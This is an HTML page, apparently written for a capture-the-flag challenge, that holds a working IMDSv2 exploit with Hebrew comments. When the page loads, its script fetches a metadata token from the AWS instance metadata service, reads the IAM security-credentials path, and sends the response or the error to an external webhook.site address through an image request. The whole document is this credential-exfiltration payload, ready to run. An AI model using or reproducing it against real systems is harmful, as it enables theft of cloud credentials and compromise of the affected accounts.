<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>IMDSv2 CTF Exploit</title>
</head>
<body>
  <h1>Running IMDSv2 Exploit...</h1>
  <script>
    // URL של ה-webhook שלך
    const webhookURL = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d';

    // בקשה לקבלת טוקן ל-IMDSv2
    fetch('http://169.254.169.254/latest/api/token', {
      method: 'PUT',
      headers: {
        'X-aws-ec2-metadata-token-ttl-seconds': '21600'
      }
    })
    .then(response => {
      if (!response.ok) throw new Error('Failed to get token');
      return response.text();
    })
    .then(token => {
      // השתמש בטוקן כדי לבקש מידע מה-metadata
      return fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/', {
        headers: {
          'X-aws-ec2-metadata-token': token
        }
      })
      .then(res => {
        if (!res.ok) throw new Error('Failed to get metadata');
        return res.text();
      })
      .then(data => {
        // שלח את המידע ל-webhook שלך
        new Image().src = webhookURL + '?data=' + encodeURIComponent(data);
      });
    })
    .catch(error => {
      // במקרה של שגיאה - שלח את ההודעה ל-webhook
      new Image().src = webhookURL + '?error=' + encodeURIComponent(error.message);
    });
  </script>
</body>
</html>
